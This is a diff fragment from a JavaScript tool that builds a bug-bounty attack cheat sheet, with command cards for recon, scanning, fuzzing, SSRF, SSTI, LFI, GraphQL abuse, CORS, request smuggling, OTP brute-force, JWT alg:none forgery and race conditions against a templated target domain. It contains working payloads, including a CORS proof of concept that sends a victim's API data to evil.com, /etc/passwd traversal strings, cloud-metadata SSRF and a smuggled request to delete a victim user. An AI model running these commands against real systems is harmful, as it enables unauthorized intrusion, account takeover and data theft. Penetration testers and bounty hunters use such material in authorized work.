+  sections.push(buildSection(3,'🏗️','ASN, IP & Infrastructure Discovery',['ASN','CIDR','masscan','nmap','naabu','shodan'],[
+    buildCmdCard('asnmap — org to ASN to CIDR ranges',`asnmap -d ${D} -silent | tee asn_${D}.txt`),
+    buildCmdCard('masscan — ultra-fast port scan across IP range',`masscan -p0-65535 --rate=10000 -iL ip_ranges_${D}.txt -oL masscan_${D}.txt`),
+    buildCmdCard('nmap — service version + OS detection',`nmap -sV -sC -T4 -iL resolved_${D}.txt --open -oA nmap_${D}`),
+    buildCmdCard('naabu — fast port scan on all subdomains',`naabu -iL all_subs_${D}.txt -p 80,443,8080,8443,8888,3000,4000,5000,9090,9443 -silent -o naabu_${D}.txt`),
+    buildCmdCard('httpx — banner grab on all hosts',`cat resolved_${D}.txt | httpx -title -server -status-code -content-length -silent -o httpx_${D}.txt`),
+    buildCmdCard('Shodan search by org',`shodan search org:"${D}" --fields ip_str,port,product,os | head -100`),
+    buildCmdCard('DNS history — find CDN-bypassed origin IPs',`curl -s "https://api.securitytrails.com/v1/history/${D}/dns/a?apikey=YOUR_KEY" | jq -r '.records[].values[].ip' | sort -u`),
+  ],[
+    'asnmap gives full CIDR ranges — scoping goldmine for wildcard programs.',
+    'masscan on ranges then nmap -sV on interesting ports only for accuracy.',
+    'DNS history reveals origin IPs behind Cloudflare — direct access bypasses WAF.',
+    'Shodan + Censys reveal dev/staging servers not in DNS.',
+  ]));
+
+  sections.push(buildSection(4,'📸','Live Hosts & Screenshots',['httpx','gowitness','aquatone','alive','filtering'],[
+    buildCmdCard('httpx — full metadata probe',`cat all_subs_${D}.txt | httpx -silent -status-code -title -tech-detect -content-length -follow-redirects -o httpx_live_${D}.txt`),
+    buildCmdCard('httpx — JSON output for processing',`cat all_subs_${D}.txt | httpx -silent -json -o httpx_json_${D}.json -threads 50`),
+    buildCmdCard('gowitness — bulk screenshots + HTML report',`gowitness file -f httpx_live_${D}.txt --delay 2 --screenshot-path ./screenshots/${D}/ --report-path ./report_${D}.html`),
+    buildCmdCard('aquatone — screenshot + clustering report',`cat all_subs_${D}.txt | aquatone -out aquatone_${D}/ -screenshot-timeout 20000 -threads 10`),
+    buildCmdCard('Filter 200 OK only',`grep " 200 " httpx_live_${D}.txt | awk '{print $1}' | tee live200_${D}.txt`),
+    buildCmdCard('Find high-value targets automatically',`cat all_subs_${D}.txt | grep -iE 'admin|portal|api|dev|stage|test|internal|vpn|remote|git|jenkins|grafana|kibana|elastic|mongo|redis|sonar|jira' | tee interesting_${D}.txt`),
+  ],[
+    'Pipe all subs through httpx first — live host filtering saves time on everything after.',
+    'Run gowitness immediately — visual review finds more than grep.',
+    'Prioritize: jenkins, grafana, kibana, sonar, git = high-value, weak default creds.',
+    'Tag 401/403 endpoints separately — often bypassable (Section 19).',
+  ]));
+
+  sections.push(buildSection(5,'🔗','URL & Endpoint Discovery',['katana','gospider','gau','wayback','JS','LinkFinder'],[
+    buildCmdCard('katana — fast crawl with JS parsing',`katana -u https://${D} -d 5 -jc -silent -o katana_${D}.txt`),
+    buildCmdCard('katana — crawl all live hosts',`katana -list live200_${D}.txt -d 3 -jc -silent -concurrency 20 -o katana_all_${D}.txt`),
+    buildCmdCard('gospider — recursive web spider',`gospider -s https://${D} -c 10 -d 4 --blacklist ".(jpg|jpeg|gif|css|ico|png|svg)" -o gospider_${D}/`),
+    buildCmdCard('hakrawler — fast URL extraction',`echo https://${D} | hakrawler -depth 3 -insecure -subs | tee hakrawler_${D}.txt`),
+    buildCmdCard('Combine + deduplicate all URLs',`cat katana_${D}.txt gospider_${D}/*.txt hakrawler_${D}.txt wayback_${D}.txt gau_${D}.txt | sort -u | tee all_urls_${D}.txt && wc -l all_urls_${D}.txt`),
+    buildCmdCard('Extract all JS files',`cat all_urls_${D}.txt | grep -E '\\.js(\\?|$)' | sort -u | tee js_files_${D}.txt`),
+    buildCmdCard('LinkFinder — endpoints from JS files',`while read url; do python3 linkfinder.py -i "$url" -o cli 2>/dev/null; done < js_files_${D}.txt | sort -u | tee linkfinder_${D}.txt`),
+    buildCmdCard('SecretFinder — API keys/secrets from JS',`while read url; do python3 SecretFinder.py -i "$url" -o cli 2>/dev/null; done < js_files_${D}.txt | tee secrets_js_${D}.txt`),
+    buildCmdCard('uro — filter unique param URL patterns',`cat all_urls_${D}.txt | grep '?' | uro | tee params_${D}.txt`),
+  ],[
+    'Run katana + gospider active crawl while gau/wayback run passively in background.',
+    'JS analysis = highest ROI: linkfinder finds hidden APIs, SecretFinder finds keys.',
+    'uro deduplication removes noise — keeps unique parameter patterns.',
+    'Feed all_urls into parameter hunting pipeline (Section 6).',
+  ]));
+
+  sections.push(buildSection(6,'🧩','Parameter & Endpoint Fuzzing',['arjun','ffuf','feroxbuster','dirsearch','403-bypass'],[
+    buildCmdCard('arjun — automatic parameter discovery',`arjun -u https://${D}/endpoint --stable -m GET,POST -oT arjun_${D}.txt`),
+    buildCmdCard('arjun — batch mode from URL list',`arjun -i live200_${D}.txt -oT arjun_batch_${D}.txt -t 10`),
+    buildCmdCard('ffuf — directory brute-force',`ffuf -u https://${D}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -mc 200,301,302,403 -t 50 -o ffuf_dir_${D}.json -of json`),
+    buildCmdCard('ffuf — recursive mode',`ffuf -u https://${D}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -recursion -recursion-depth 2 -mc all -fc 404 -t 40`),
+    buildCmdCard('feroxbuster — recursive content discovery',`feroxbuster --url https://${D} --wordlist /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --depth 3 --threads 50 --output ferox_${D}.txt`),
+    buildCmdCard('ffuf — API endpoint fuzzing',`ffuf -u https://${D}/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,204,400,401,403 -t 40`),
+    buildCmdCard('ffuf — virtual host discovery',`ffuf -u https://${D} -H "Host: FUZZ.${D}" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301,302 -fs 0`),
+    buildCmdCard('403 bypass — X-Original-URL header trick',`ffuf -u https://${D}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -H "X-Original-URL: /FUZZ" -mc 200,301 -t 30`),
+    buildCmdCard('403 bypass — path manipulation',`# https://DOMAIN/admin (403)\ncurl -s https://${D}/admin/ -H "X-Original-URL: /admin"\ncurl -s "https://${D}/%2fadmin"\ncurl -s "https://${D}/admin/."\ncurl -s "https://${D}//admin//"`),
+  ],[
+    'ffuf/feroxbuster on all live hosts with common wordlists for directory discovery.',
+    'Use arjun on interesting endpoints to discover hidden parameters.',
+    'API paths need API-specific wordlists (SecLists /api/ folder).',
+    '403 bypass tricks still win bounties in 2025 — always try before marking OOS.',
+    'Check backup extensions: .bak .old .php~ .php.bak on all discovered files.',
+  ]));
+
+  sections.push(buildSection(7,'💥','Vulnerability Scanning',['nuclei','nikto','testssl','CVE','misconfig'],[
+    buildCmdCard('nuclei — full severity scan',`nuclei -l httpx_live_${D}.txt -t ~/nuclei-templates/ -severity critical,high,medium -o nuclei_${D}.txt -stats`),
+    buildCmdCard('nuclei — CVE-only scan',`nuclei -l httpx_live_${D}.txt -tags cve -severity critical,high -o nuclei_cve_${D}.txt`),
+    buildCmdCard('nuclei — exposure + misconfig scan',`nuclei -l httpx_live_${D}.txt -tags exposure,misconfig,default-login -o nuclei_exposure_${D}.txt`),
+    buildCmdCard('nuclei — fuzzing mode',`nuclei -l live200_${D}.txt -t ~/nuclei-templates/fuzzing/ -severity medium,high,critical -o nuclei_fuzz_${D}.txt`),
+    buildCmdCard('nuclei — update templates first',`nuclei -update-templates && nuclei -ut`),
+    buildCmdCard('nikto — comprehensive web server scan',`nikto -h https://${D} -output nikto_${D}.txt -Format txt -Tuning x 6`),
+    buildCmdCard('testssl.sh — TLS/SSL misconfiguration check',`testssl.sh --severity HIGH --quiet https://${D} | tee testssl_${D}.txt`),
+  ],[
+    'Always update nuclei templates before scanning.',
+    'Run critical/high first, medium/low after — triage quickly.',
+    'testssl.sh on all HTTPS services — SSL misconfigs are easy P3/P4 bounties.',
+    'nikto catches different issues than nuclei — run both.',
+  ]));
+
+  sections.push(buildSection(8,'🎯','Subdomain Takeover',['subjack','nuclei','CNAME','dead-DNS','takeover'],[
+    buildCmdCard('subjack — automated takeover detection',`subjack -w all_subs_${D}.txt -t 50 -timeout 30 -o subjack_${D}.txt -ssl -c ~/fingerprints.json`),
+    buildCmdCard('nuclei — takeover templates',`nuclei -l all_subs_${D}.txt -t ~/nuclei-templates/http/takeovers/ -o nuclei_takeover_${D}.txt`),
+    buildCmdCard('dnsx — extract all CNAME records',`cat all_subs_${D}.txt | dnsx -silent -cname -resp | grep CNAME | tee cnames_${D}.txt`),
+    buildCmdCard('Filter dangerous CNAMEs (S3, GitHub, Heroku)',`cat cnames_${D}.txt | grep -iE 'amazonaws|github\.io|herokuapp|shopify|fastly|netlify|azurewebsites' | tee takeover_candidates_${D}.txt`),
+    buildCmdCard('httpx — detect takeover error messages',`cat all_subs_${D}.txt | httpx -silent -status-code -title | grep -E "(NoSuchBucket|There is no app|No Such Site|not found)" | tee takeover_hits_${D}.txt`),
+  ],[
+    'Takeovers ONLY happen on CNAMEs pointing to third-party — extract CNAMEs first.',
+    'Map CNAME targets: GitHub Pages, Heroku, Shopify, Fastly, Netlify, S3.',
+    'Verify manually — check if service can be claimed with your account.',
+    'Report immediately — typically P1/P2, fixed quickly.',
+  ]));
+
+  sections.push(buildSection(9,'☁️','Cloud Misconfiguration Hunting',['S3','GCS','Azure','Firebase','cloud_enum','bucket'],[
+    buildCmdCard('cloud_enum — find cloud resources (AWS/GCS/Azure)',`cloud_enum -k ${D} -k $(echo ${D} | tr '.' '-') -l cloud_enum_${D}.txt`),
+    buildCmdCard('s3scanner — find and test S3 bucket permissions',`s3scanner scan --buckets-file bucket_names_${D}.txt --threads 20 | tee s3scanner_${D}.txt`),
+    buildCmdCard('AWS CLI — check S3 bucket public read',`aws s3 ls s3://${D} --no-sign-request 2>&1 | head -20`),
+    buildCmdCard('AWS CLI — check bucket ACL',`aws s3api get-bucket-acl --bucket ${D} --no-sign-request 2>&1`),
+    buildCmdCard('GCS bucket enumeration',`curl -s "https://storage.googleapis.com/${D}/" | grep -o 'Key>[^<]*' | cut -d'>' -f2 | head -20`),
+    buildCmdCard('Azure blob storage listing','curl -s "https://DOMAIN.blob.core.windows.net/?comp=list" | grep -oP \'<Name>[^<]+</Name>\''),
+    buildCmdCard('Firebase open database check','curl -s "https://DOMAIN-default-rtdb.firebaseio.com/.json?shallow=true" | head -100'),
+    buildCmdCard('nuclei — cloud misconfiguration templates',`nuclei -l httpx_live_${D}.txt -tags aws,gcp,azure,cloud -o nuclei_cloud_${D}.txt`),
+    buildCmdCard('Find S3 URLs embedded in pages/JS',`cat all_urls_${D}.txt | grep -Eo 's3[.-][a-z0-9.-]+\.amazonaws\.com/[^"& ]+' | sort -u | tee s3_urls_${D}.txt`),
+  ],[
+    'Generate all bucket name variations: brand, product, dept, team names.',
+    'Always try --no-sign-request on AWS CLI — unauthenticated access = the bug.',
+    'S3 URLs in JS/HTML = direct access to files, often no auth required.',
+    'Test Firebase, GCS, Azure — teams use multiple cloud providers.',
+  ]));
+
+  sections.push(buildSection(10,'⚡','SSRF, SSTI, LFI, XXE, Open Redirect',['SSRF','SSTI','LFI','XXE','OpenRedirect','CRLF'],[
+    buildCmdCard('SSRF — test params for AWS metadata',`cat params_${D}.txt | qsreplace "http://169.254.169.254/latest/meta-data/" | xargs -I{} curl -sk {} | grep -i "ami-id\\|hostname\\|instance-id"`),
+    buildCmdCard('SSRF — blind via interactsh OOB',`cat params_${D}.txt | qsreplace "https://YOUR_ID.oast.pro" | httpx -silent -status-code`),
+    buildCmdCard('SSRF — bypass techniques cheatsheet',`# Direct: http://169.254.169.254/\n# IPv6: http://[::ffff:169.254.169.254]/\n# Decimal: http://2130706433/\n# DNS rebind: http://169.254.169.254.nip.io/\n# Redirect chain: https://${D}/redirect?url=http://169.254.169.254/`),
+    buildCmdCard('Open Redirect — find redirect params in all URLs',`cat all_urls_${D}.txt | grep -Ei '(redirect|redir|return|next|url|goto|target|dest|destination)=' | sort -u | tee redirects_${D}.txt`),
+    buildCmdCard('SSTI — detect via 7*7=49',`cat params_${D}.txt | qsreplace "{{7*7}}" | httpx -silent | grep "49"`),
+    buildCmdCard('SSTI — polyglot for multiple engines',`# Jinja2: {{7*7}} → 49\n# Twig: {{7*'7'}} → 7777777\n# ERB: <%= 7*7 %> → 49\n# Freemarker: #{7*7} → 49`),
+    buildCmdCard('LFI — basic path traversal test',`cat params_${D}.txt | qsreplace "../../../etc/passwd" | httpx -silent | grep "root:x:"`),
+    buildCmdCard('LFI — traversal bypass variants',`# URL encoded: ..%2F..%2Fetc%2Fpasswd\n# Double: ..%252f..%252fetc/passwd\n# Dotdotslash: ....//....//etc/passwd\n# PHP wrapper: php://filter/convert.base64-encode/resource=index.php`),
+    buildCmdCard('Host header injection — cache poisoning / SSRF',`curl -s -H "Host: evil.com" https://${D}/ | grep -i "evil.com"`),
+    buildCmdCard('CRLF injection — header injection check',`cat all_urls_${D}.txt | qsreplace $'%0d%0aSet-Cookie:crlftest=1' | httpx -silent -H "Set-Cookie" | grep "crlftest"`),
+  ],[
+    'Test SSRF on ALL URL/callback/domain parameters — cloud metadata = P1.',
+    'Use interactsh (interact.sh) for blind SSRF/XXE/SSTI OOB detection.',
+    'SSTI found in: error pages, email templates, PDF generators, notification templates.',
+    'LFI + log poisoning = RCE chain — escalate impact before reporting.',
+    'CRLF + open redirect = session fixation chain — mention both in report.',
+  ]));
+
+  sections.push(buildSection(11,'🔷','GraphQL Security Testing',['GraphQL','Introspection','Batching','IDOR','Mutations'],[
+    buildCmdCard('Find GraphQL endpoints',`ffuf -u https://${D}/FUZZ -w <(echo -e "graphql\napi/graphql\nv1/graphql\nv2/graphql\ngraphiql\ngraph\nquery\napi/query\nconsole") -mc 200,400 -t 20`),
+    buildCmdCard('Introspection — full schema dump',`curl -s -X POST https://${D}/graphql -H "Content-Type: application/json" -d '{"query":"{__schema{types{name fields{name args{name type{name}}}}}}"}' | python3 -m json.tool`),
+    buildCmdCard('Check if introspection is enabled',`curl -s -X POST https://${D}/graphql -H "Content-Type: application/json" -d '{"query":"{__typename}"}' | jq .`),
+    buildCmdCard('Introspection bypass via GET + newline',`curl -s "https://${D}/graphql?query=%0A{__schema{types{name}}}" | jq .`),
+    buildCmdCard('Batch attack — OTP/login rate limit bypass',`curl -s -X POST https://${D}/graphql -H "Content-Type: application/json" -d '[{"query":"mutation{login(username:\\"admin\\",password:\\"111\\")}"},{"query":"mutation{login(username:\\"admin\\",password:\\"222\\")}"},{"query":"mutation{login(username:\\"admin\\",password:\\"333\\")}"}]'`),
+    buildCmdCard('IDOR via object ID in query',`curl -s -X POST https://${D}/graphql -H "Authorization: Bearer USER_TOKEN" -d '{"query":"{order(id:\\"VICTIM_ORDER_ID\\"){total items{name}customer{email}}}"}' | jq .`),
+    buildCmdCard('Alias batching — mass IDOR harvest',`curl -s -X POST https://${D}/graphql -H "Content-Type: application/json" -d '{"query":"{a:user(id:1){email} b:user(id:2){email} c:user(id:3){email} d:user(id:4){email} e:user(id:5){email}}"}' | jq .`),
+    buildCmdCard('Mutation privilege escalation',`curl -s -X POST https://${D}/graphql -H "Content-Type: application/json" -d '{"query":"mutation{updateUser(id:\\"VICTIM\\",role:\\"admin\\"){id role}}"}' | jq .`),
+    buildCmdCard('Field suggestion — discover hidden fields via typo',`curl -s -X POST https://${D}/graphql -d '{"query":"{user{passwrd}}"}' | jq .errors`),
+    buildCmdCard('graphw00f — fingerprint GraphQL engine',`python3 graphw00f.py -d -t https://${D}`),
+  ],[
+    'Introspection enabled = full schema exposed — map all types, queries, mutations first.',
+    'Batch queries bypass OTP and login rate limits — test every mutation.',
+    'IDOR in GraphQL: fuzz all ID fields, same as REST but via query arguments.',
+    'Field suggestions in errors reveal undocumented fields — always trigger typos.',
+    'Use InQL Burp plugin — auto-generates all queries from introspection, huge time saver.',
+    'Mutations often lack authorization — test each mutation as low-priv user.',
+  ]));
+
+  sections.push(buildSection(12,'🌍','CORS & CSP Misconfiguration',['CORS','CSP','Origin','Clickjacking','Headers'],[
+    buildCmdCard('CORS — arbitrary origin reflected check',`curl -s -H "Origin: https://evil.com" -H "Cookie: session=YOUR_TOKEN" https://${D}/api/user -v 2>&1 | grep -i "access-control"`),
+    buildCmdCard('CORS — null origin bypass',`curl -s -H "Origin: null" https://${D}/api/sensitive -v 2>&1 | grep -i "access-control-allow"`),
+    buildCmdCard('CORS — pre-domain match bypass',`curl -s -H "Origin: https://evil${D}" https://${D}/api/data -v 2>&1 | grep -i "access-control"`),
+    buildCmdCard('CORS — post-domain bypass',`curl -s -H "Origin: https://${D}.evil.com" https://${D}/api/data -v 2>&1 | grep -i "access-control"`),
+    buildCmdCard('Bulk CORS check across all live hosts',`cat live200_${D}.txt | httpx -silent -H "Origin: https://evil.com" -match-regex "Access-Control-Allow-Origin: (\\*|https://evil)" -o cors_vuln_${D}.txt`),
+    buildCmdCard('CORS PoC JavaScript',`fetch('https://${D}/api/me',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://evil.com/?d='+btoa(d)))`),
+    buildCmdCard('Clickjacking — check X-Frame-Options header',`curl -s -I https://${D} | grep -iE "x-frame-options|frame-ancestors"`),
+    buildCmdCard('nuclei — CORS misconfiguration scan',`nuclei -l live200_${D}.txt -tags cors -o nuclei_cors_${D}.txt`),
+  ],[
+    'CORS only impactful with withCredentials=true — verify cookies/tokens are sent.',
+    'Test all origin variations: evil.DOMAIN, DOMAIN.evil.com, null, evilDOMAIN.',
+    'Missing X-Frame-Options + sensitive action = clickjacking P3 — quick win.',
+    'Report CORS only when you can read sensitive API response — not just the header.',
+  ]));
+
+  sections.push(buildSection(13,'🚇','HTTP Request Smuggling',['CL.TE','TE.CL','H2C','Desync','Burp-Smuggler'],[
+    buildCmdCard('Timing-based CL.TE detection',`# Send: Content-Length: 4 + Transfer-Encoding: chunked + body: 1\r\naZ\r\n\n# If delay > 10s = potentially vulnerable`),
+    buildCmdCard('CL.TE — basic smuggle payload',`POST / HTTP/1.1\r\nHost: ${D}\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED`),
+    buildCmdCard('TE.CL — smuggle payload',`POST / HTTP/1.1\r\nHost: ${D}\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n`),
+    buildCmdCard('TE.TE obfuscation — confuse dual-server setup',`# Variant 1:\nTransfer-Encoding: chunked\nTransfer-Encoding: identity\n# Variant 2:\nTransfer-Encoding: xchunked\n# Variant 3:\nTransfer-Encoding : chunked (note space before colon)`),
+    buildCmdCard('H2.CL — HTTP/2 downgrade smuggling (Burp)',`# In Burp Repeater (HTTP/2):\n:method: POST\n:path: /\ncontent-length: 0\n\nGET /admin HTTP/1.1\nHost: ${D}\nContent-Length: 10\n\nx=`),
+    buildCmdCard('Burp HTTP Request Smuggler extension',`# Burp > Extender > BApp Store > HTTP Request Smuggler\n# Scan > Right-click endpoint > Extensions > Smuggle probe\n# Auto-detects CL.TE, TE.CL, H2.CL, H2.TE`),
+    buildCmdCard('Smuggling to bypass access controls',`# Prepend GET /admin to next user request:\nPOST / HTTP/1.1\r\nContent-Length: 116\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin/delete?user=victim HTTP/1.1\r\nHost: ${D}\r\nContent-Length: 10\r\n\r\nx=`),
+  ],[
+    'Use Burp HTTP Request Smuggler extension — manual detection is extremely hard.',
+    'CL.TE most common on nginx-to-Apache or Cloudflare-to-origin setups.',
+    'H2 downgrade smuggling = highest impact in 2024-25 — test in Burp HTTP/2 mode.',
+    'Smuggling to bypass ACL or capture sessions = P1 always.',
+    'Always have explicit written scope permission — affects other users.',
+  ]));
+
+  sections.push(buildSection(14,'🔌','API Security Deep Dive',['REST','Swagger','BOLA','IDOR','Mass-Assignment','versioning'],[
+    buildCmdCard('Find Swagger / OpenAPI spec files',`ffuf -u https://${D}/FUZZ -w <(echo -e "swagger.json\nopenapi.json\nopenapi.yaml\napi-docs\nv2/api-docs\nv3/api-docs\nswagger-ui.html") -mc 200 -t 20`),
+    buildCmdCard('Parse Swagger — dump all endpoints + methods',`curl -s https://${D}/swagger.json | python3 -c "import json,sys; d=json.load(sys.stdin); [print(m.upper(), p) for p,v in d['paths'].items() for m in v]"`),
+    buildCmdCard('API version enumeration — old/undocumented versions',`ffuf -u https://${D}/FUZZ/users -w <(echo -e "api\napi/v1\napi/v2\napi/v3\napi/v0\nv1\nv2\nv3\nrest/v1\nrest/v2") -mc 200,401,403 -t 20`),
+    buildCmdCard('BOLA/IDOR — fuzz object IDs',`ffuf -u https://${D}/api/v1/orders/FUZZ -H "Authorization: Bearer USER_TOKEN" -w <(seq 1 5000) -mc 200 -t 30`),
+    buildCmdCard('Broken function-level auth — admin endpoint as user',`curl -s -H "Authorization: Bearer LOW_PRIV_TOKEN" https://${D}/api/v1/admin/users | jq .`),
+    buildCmdCard('Mass assignment — inject privilege fields',`curl -s -X POST https://${D}/api/v1/register -H "Content-Type: application/json" -d '{"username":"hacker","password":"test","role":"admin","isAdmin":true,"is_verified":true}'`),
+    buildCmdCard('HTTP method override — DELETE via POST',`curl -s -X POST https://${D}/api/v1/users/1 -H "X-HTTP-Method-Override: DELETE" -H "Authorization: Bearer TOKEN" | jq .`),
+  ],[
+    'Find Swagger/OpenAPI first — maps entire attack surface in one file.',
+    'BOLA = #1 API vulnerability — fuzz every numeric/UUID identifier.',
+    'Test every endpoint with low-priv token — broken function level auth very common.',
+    'Old API versions (v1 vs v2) lack security patches — test both always.',
+    'Mass assignment: send every field from GET responses back in POST/PUT.',
+  ]));
+
+  sections.push(buildSection(15,'⏱️','API Rate Limit Testing',['Rate-Limit','Bypass','OTP','Brute-Force','Race','Throttle'],[
+    buildCmdCard('Basic rate limit check — 50 rapid requests',`for i in $(seq 1 50); do curl -s -o /dev/null -w "%{http_code} " -X POST https://${D}/api/login -H "Content-Type: application/json" -d '{"username":"admin","password":"test"}'; done`),
+    buildCmdCard('IP bypass — X-Forwarded-For header spoofing',`ffuf -u https://${D}/api/login -X POST -H "Content-Type: application/json" -H "X-Forwarded-For: FUZZ" -d '{"username":"admin","password":"test"}' -w <(for i in $(seq 1 200); do echo "10.0.$((RANDOM%255)).$((RANDOM%255))"; done) -mc 200`),
+    buildCmdCard('IP bypass — all headers to try',`# X-Real-IP\n# X-Originating-IP\n# CF-Connecting-IP\n# True-Client-IP\n# X-Cluster-Client-IP\n# Forwarded: for=1.2.3.4`),
+    buildCmdCard('OTP brute-force — 6-digit test',`ffuf -u https://${D}/api/verify-otp -X POST -H "Content-Type: application/json" -d '{"otp":"FUZZ","email":"victim@test.com"}' -w <(seq -f "%06g" 0 999999) -mc 200 -t 5`),
+    buildCmdCard('OTP bypass — try predictable codes first',`for otp in 000000 111111 123456 000001 999999 654321; do echo -n "Testing $otp: "; curl -s -X POST https://${D}/api/verify-otp -H "Content-Type: application/json" -d "{\"otp\":\"$otp\"}" | grep -oP '"(status|message|error)":"[^"]+"'; done`),
+    buildCmdCard('GraphQL batch — bypass mutation rate limits',`curl -s -X POST https://${D}/graphql -H "Content-Type: application/json" -d '[{"query":"mutation{verifyOTP(code:\\"111\\")}"},{"query":"mutation{verifyOTP(code:\\"222\\")}"},{"query":"mutation{verifyOTP(code:\\"333\\")}"}]'`),
+    buildCmdCard('Race condition — parallel bash requests',`for i in $(seq 1 30); do curl -s -X POST https://${D}/api/redeem -H "Authorization: Bearer TOKEN" -d '{"code":"SAVE50"}' & done; wait`),
+    buildCmdCard('Turbo Intruder — single-packet attack (Burp)',`# Burp > Extender > Turbo Intruder > race-single-packet-attack.py\n# Targets: /api/redeem, /api/verify-otp, /api/transfer, /api/vote`),
+    buildCmdCard('Account lockout threshold test',`for i in $(seq 1 20); do code=$(curl -s -X POST https://${D}/api/login -d '{"username":"admin","password":"wrong'$i'"}' | jq -r '.error // "no error"'); echo "Attempt $i: $code"; sleep 0.2; done`),
+  ],[
+    'Always test rate limiting before brute-force — know threshold and lockout policy.',
+    'X-Forwarded-For spoofing bypasses IP-based rate limits on 70%+ of targets.',
+    'GraphQL batch queries bypass per-request limits — test all mutation endpoints.',
+    'Race condition on OTP = MFA bypass — single-packet attack with Turbo Intruder.',
+    'OTP brute-force without lockout = instant P1 — test every 2FA implementation.',
+    'Report: "rate limit bypassable via X-Forwarded-For on /api/login" = P2 minimum.',
+  ]));
+
+  sections.push(buildSection(16,'🔐','Auth & Session Testing',['OAuth','JWT','MFA','PasswordReset','SessionFixation','Cookies'],[
+    buildCmdCard('Password reset — host header injection',`curl -s -X POST https://${D}/forgot-password -H "Host: evil.com" -H "Content-Type: application/json" -d '{"email":"victim@${D}"}' -v 2>&1 | grep -i "location\|set-cookie"`),
+    buildCmdCard('OAuth — open redirect in redirect_uri',`curl -v "https://${D}/oauth/authorize?client_id=APP&redirect_uri=https://evil.com&response_type=code&scope=read" 2>&1 | grep -i location`),
+    buildCmdCard('OAuth — missing state param = CSRF account linking',`# No state in /oauth/authorize:\n# 1. Attacker starts OAuth, stops before redirect\n# 2. Sends crafted URL to victim\n# 3. Victim completes auth → code binds to attacker account`),
+    buildCmdCard('Session fixation — compare pre/post login session ID',`curl -c pre.txt https://${D}/login -s -o /dev/null\ncurl -b pre.txt -c post.txt -s -X POST https://${D}/login -d 'user=test&pass=test'\n# diff pre.txt post.txt — same session ID = fixation bug`),
+    buildCmdCard('MFA bypass — manipulate 2FA response in Burp',`# 1. Submit wrong OTP\n# 2. Intercept response\n# 3. Change {"verified":false} → {"verified":true}\n# 4. Or change HTTP 403 → 200`),
+    buildCmdCard('JWT — brute-force weak HMAC secret',`hashcat -a 0 -m 16500 YOUR.JWT.TOKEN /usr/share/wordlists/rockyou.txt`),
+    buildCmdCard('JWT — alg:none bypass',`python3 -c "import base64,json; h=base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('='); p=base64.b64encode(json.dumps({'user':'admin','role':'admin'}).encode()).decode().rstrip('='); print(f'{h}.{p}.')"`),
+    buildCmdCard('Cookie security flags audit',`curl -s -I https://${D} | grep -i "set-cookie"\n# Need: Secure + HttpOnly + SameSite=Strict/Lax\n# Missing Secure = HTTP theft | Missing HttpOnly = XSS steals | Missing SameSite = CSRF`),
+  ],[
+    'Password reset host header injection = consistent P1 — test on every engagement.',
+    'OAuth missing state = CSRF account linking — easy to demo, high payout.',
+    'MFA bypass via response manipulation works on shocking number of targets.',
+    'JWT: alg:none first (instant), then weak secret (hashcat), then kid injection.',
+    'Session fixation: 5 minutes to test, P2 if confirmed.',
+  ]));
+
+  sections.push(buildSection(17,'⚙️','Business Logic & Race Conditions',['Race-Condition','Logic-Flaw','Coupon','Turbo-Intruder','Price-Manipulation'],[
+    buildCmdCard('Race condition — parallel curl requests',`for i in $(seq 1 25); do curl -s -X POST https://${D}/api/redeem -H "Authorization: Bearer TOKEN" -d '{"code":"SAVE50"}' & done; wait`),
+    buildCmdCard('Turbo Intruder — single-packet (Burp)',`# Best targets: redeem coupon, transfer funds, vote, claim reward, apply discount`),
+    buildCmdCard('Negative quantity / price manipulation',`curl -s -X POST https://${D}/api/cart -H "Content-Type: application/json" -d '{"product_id":1,"qty":-1,"price":-99.99}' | jq .`),
+    buildCmdCard('Workflow step bypass — skip payment',`# Steps: cart → shipping → payment → confirm\n# Try POST /api/confirm directly without /payment\n# If server trusts client state = free order`),
+    buildCmdCard('IDOR on export/report download',`ffuf -u "https://${D}/api/export?report_id=FUZZ" -H "Authorization: Bearer TOKEN" -w <(seq 1 1000) -mc 200 -t 20`),
+    buildCmdCard('File upload — extension + MIME bypass',`# Extensions: .php .php5 .phtml .phar\n# Double ext: shell.jpg.php\n# MIME: Content-Type: image/jpeg (with .php)\n# Null byte: shell.php%00.jpg`),
+  ],[
+    'Race conditions on coupon/reward redemption = free money PoC — highest acceptance.',
+    'Test every payment flow: negative quantities, zero prices, missing required fields.',
+    'Workflow bypass: POST to final confirmation without completing payment = free items.',
+    'Business logic bugs need manual creativity — think "what would break this feature?"',
+  ]));
+
+  sections.push(buildSection(18,'🤖','Recon Automation & Monitoring',['notify','anew','cron','monitor','trufflehog','continuous'],[
+    buildCmdCard('anew — only pipe NEW unseen assets forward',`subfinder -d ${D} -silent | anew all_subs_${D}.txt | httpx -silent | nuclei -t ~/nuclei-templates/ | notify`),
+    buildCmdCard('Daily cron — new subs → scan → alert',`# crontab -e:\n0 8 * * * subfinder -d ${D} -silent | anew ~/monitor/subs_${D}.txt | httpx -silent | nuclei -severity critical,high | notify -provider telegram`),
+    buildCmdCard('Monitor JS file hash changes',`cat js_files_${D}.txt | xargs -I{} bash -c 'echo -n "{} "; curl -sk "{}" | sha256sum' > js_hashes_new.txt && diff js_hashes_old.txt js_hashes_new.txt && mv js_hashes_new.txt js_hashes_old.txt`),
+    buildCmdCard('nuclei — new templates only (daily CVE scan)',`nuclei -l live200_${D}.txt -nt -severity critical,high -o nuclei_newcve_${D}.txt | notify`),
+    buildCmdCard('trufflehog — scan GitHub org for leaked secrets',`trufflehog github --org=${D} --only-verified 2>/dev/null | tee github_leaks_${D}.txt`),
